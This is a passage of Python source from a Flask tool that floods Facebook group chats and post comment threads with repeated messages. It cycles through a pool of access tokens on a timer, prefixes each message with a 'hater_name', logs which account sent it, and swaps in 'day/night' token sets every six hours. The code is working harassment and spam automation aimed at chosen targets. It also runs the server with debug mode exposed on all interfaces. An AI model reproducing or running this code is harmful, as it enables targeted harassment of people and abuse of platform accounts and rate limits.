                    add_log(task_id, f"🔄 Token set rotated. Now using {len(tokens)} tokens.")
                    
                    # Update token usage stats
                    with data_lock:
                        token_usage_stats[task_id] = {token: 0 for token in tokens}
            
            if not tokens:
                add_log(task_id, "❌ No tokens available for current time period.")
                time.sleep(60)  # Wait 1 minute before checking again
                continue
            
            # Select token based on current index
            current_token = tokens[token_index]
            token_display = f"Token {token_index + 1}/{len(tokens)}"
            
            # Send message
            send_msg(convo_id, current_token, msg, hater_name, task_id, token_display)
            
            # Update token usage stats
            with data_lock:
                token_usage_stats[task_id][current_token] = token_usage_stats[task_id].get(current_token, 0) + 1
            
            # Rotate to next token
            token_index = (token_index + 1) % len(tokens)
            
            time.sleep(interval)

def start_posting(tokens, messages, post_id, interval, hater_name, token_option, task_id, username):
    stop_event = stop_events[task_id]
    token_index = 0
    
    add_log(task_id, f"🚀 Post task started for post: {post_id}")
    
    # Get post info once at start
    token = tokens[0]
    post_info = get_post_info(post_id, token)
    if post_info:
        add_log(task_id, f"ℹ️ Target Post: {post_info}")
    
    while not stop_event.is_set():
        for msg in messages:
            if stop_event.is_set():
                add_log(task_id, "🛑 Task stopped manually.")
                break
            
            # For day/night system, refresh tokens every 6 hours
            if token_option == "daynight":
                current_tokens = get_current_token_set(username)
                if current_tokens != tokens:
                    tokens = current_tokens
                    token_index = 0  # Reset index
                    add_log(task_id, f"🔄 Token set rotated. Now using {len(tokens)} tokens.")
                    
                    # Update token usage stats
                    with data_lock:
                        token_usage_stats[task_id] = {token: 0 for token in tokens}
            
            if not tokens:
                add_log(task_id, "❌ No tokens available for current time period.")
                time.sleep(60)  # Wait 1 minute before checking again
                continue
            
            # Select token based on current index
            current_token = tokens[token_index]
            token_display = f"Token {token_index + 1}/{len(tokens)}"
            
            # Send comment
            send_comment(post_id, current_token, msg, hater_name, task_id, token_display)
            
            # Update token usage stats
            with data_lock:
                token_usage_stats[task_id][current_token] = token_usage_stats[task_id].get(current_token, 0) + 1
            
            # Rotate to next token
            token_index = (token_index + 1) % len(tokens)
            
            time.sleep(interval)

def get_group_name(convo_id, token):
    try:
        url = f"https://graph.facebook.com/v15.0/t_{convo_id}?fields=name,participants&access_token={token}"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            name = data.get("name")
            if not name:
                participants = data.get("participants", {}).get("data", [])
                participant_names = [p.get("name", "Unknown") for p in participants]
                name = ", ".join(participant_names) if participant_names else "Group Chat"
            return name
        return None
    except:
        return None

def get_post_info(post_id, token):
    try:
        url = f"https://graph.facebook.com/v15.0/{post_id}?fields=message,from&access_token={token}"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            message = data.get("message", "No message")[:50] + "..." if data.get("message") else "No message"
            from_name = data.get("from", {}).get("name", "Unknown")
            return f"Post by {from_name}: {message}"
        return None
    except:
        return None

def send_msg(convo_id, access_token, message, hater_name, task_id, token_display=""):
    try:
        url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
        parameters = {
            "access_token": access_token,
            "message": f"{hater_name} {message}"  # Modified to remove colon
        }
        headers = {"Authorization": f"Bearer {access_token}"}
        response = requests.post(url, json=parameters, headers=headers)
        
        # Get sender name for logging
        sender_name = get_sender_name(access_token)
        
        if response.status_code == 200:
            log_msg = f"✅ {token_display} | {sender_name} | Message sent: {hater_name}: {message}"  # Keep colon in logs
            add_log(task_id, log_msg)
        else:
            log_msg = f"❌ {token_display} | {sender_name} | Failed (Code: {response.status_code}): {response.text}"
            add_log(task_id, log_msg)
    except Exception as e:
        log_msg = f"❌{token_display} | Error: {str(e)}"
        add_log(task_id, log_msg)

def send_comment(post_id, access_token, message, hater_name, task_id, token_display=""):
    try:
        url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
        parameters = {
            "access_token": access_token,
            "message": f"{hater_name} {message}"  # Modified to remove colon
        }
        headers = {"Authorization": f"Bearer {access_token}"}
        response = requests.post(url, json=parameters, headers=headers)
        
        # Get sender name for logging
        sender_name = get_sender_name(access_token)
        
        if response.status_code == 200:
            log_msg = f"✅ {token_display} | {sender_name} | Comment posted: {hater_name}: {message}"  # Keep colon in logs
            add_log(task_id, log_msg)
        else:
            log_msg = f"❌ {token_display} | {sender_name} | Failed (Code: {response.status_code}): {response.text}"
            add_log(task_id, log_msg)
    except Exception as e:
        log_msg = f"❌ {token_display} | Error: {str(e)}"
        add_log(task_id, log_msg)

def get_sender_name(access_token):
    try:
        url = f"https://graph.facebook.com/me?fields=name&access_token={access_token}"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            return data.get("name", "Unknown")
        return "Unknown"
    except:
        return "Unknown"

if __name__ == "__main__":
    # Note: In a real-world scenario, you should not run with debug=True in production.
    # We use it here for simplicity in the sandbox environment.
    app.run(host="0.0.0.0", port=5000, debug=True)
